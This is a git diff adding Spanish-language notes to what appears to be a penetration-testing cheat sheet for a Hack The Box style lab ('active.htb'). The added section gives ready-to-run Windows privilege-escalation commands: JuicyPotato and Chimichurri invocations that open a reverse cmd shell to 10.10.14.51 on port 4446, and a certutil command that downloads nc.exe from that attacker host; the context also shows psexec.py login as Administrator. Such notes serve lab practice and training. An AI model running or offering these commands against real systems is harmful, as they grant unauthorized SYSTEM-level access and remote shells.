@@ -159,7 +159,33 @@ Si con **crackmapexec smb** nos aparece **Pwned** podemos obtener acceso con pse
 psexec.py active.htb/Administrator:CONTRASEÑA@10.10.10.100 cmd.exe
 </pre>
 
+## ESCALADA DE PRIVILEGIOS
+
+### SeImpersonatePrivilege
+
+si el usuario pertenece a este grupo hay varias vias de convertirse en **NT Authority System**.
+
+#### Juicy Potato
+
+Se puede escalar privilegios, previa subida de JuicyPotato.exe y nc.exe:
+
+<pre>
+JP.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\\windows\temp\privescnc.exe -e cmd 10.10.14.51 4446"
+</pre>
+
+#### Chimichurry
+Otra vía es **Chimichurri**, aunque a veces no va.
+
+<pre>
+Chimichurri.exe 10.10.14.51 4446
+</pre>
+
 ## TRUCOS
+
+### subir archivos desde CMD:
+<pre>
+certutil.exe -f -urlcache -split http://10.10.14.51/nc.exe nc.exe
+</pre>
 
 ### Enumerar SYSVOL
 
